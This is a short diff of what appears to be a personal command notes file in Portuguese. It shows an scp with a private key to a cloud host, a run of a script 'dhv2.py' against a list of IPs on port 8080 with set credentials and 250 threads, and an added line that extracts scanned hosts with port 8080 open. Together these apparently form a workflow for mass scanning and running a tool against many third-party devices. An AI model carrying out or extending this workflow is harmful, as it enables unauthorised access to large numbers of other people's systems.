@@ -73,3 +73,5 @@ scp -r -i "C:\Users\LENOVO\Desktop\Ubuntu\chave-projeto.pem" ubuntu@3.82.175.239
 em último caso:
 
 python3 dhv2.py -f ips37777.txt -p 8080 -u pdr -P Senha@2026 -t 250
+
+grep 'open tcp 8080' ipsformatados.txt | awk '{print $4}' > ips_8080.txt
